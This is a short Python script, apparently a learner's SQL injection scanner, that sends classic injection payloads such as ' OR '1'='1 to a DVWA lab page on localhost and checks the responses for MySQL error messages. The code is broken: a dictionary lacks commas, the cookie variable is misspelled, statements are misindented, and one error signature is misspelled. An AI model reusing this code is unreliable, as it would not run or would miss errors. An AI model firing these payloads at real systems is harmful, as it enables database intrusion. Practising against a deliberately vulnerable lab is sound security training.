#!/bin/python3

import requests
import time

TARGET_URL = "http://localhost/dvwa/vulnerabilities/sqli/"
SESSION_COOKIE =  {"PHPSESSID":
"YOUR_SESSION_ID", "security": "low"}

PAYLOADS = [
	" ' ",
	"' OR '1'='1",
	"' AND 1=1--",
	"' AND 1=2--",
	]
	
SQL_ERRORS = [
	"you have an error in ypur sql syntax",
	"warning: mysql",
	"syntax error" 
	]
	
def detect_error(text):
	text = text.lower()
	for error in SQL_ERRORS:
		if error in text:
			return True
	return False
	
def scan():
	print("[*] Starting scan...\n")
	
	for payload in PAYLOADS:
		data = {
			"id": payload
			"Submit": "Submit"
			 }

		response = requests.post(
			TARGET_URL,
			data=data,
			cookies=SEESION_COOKIE
			)
			
			print(f"[+] Testing payload: {payload}")
			print(f"	Status: {response.status_code}")
			print(f"	Length: {len(response.text)}")
			
			if detect_error(response.text):
				print("		[!!!] SQL Error Detected")
			time.sleep(1)
			
if __name__ == "__main__":
	scan()
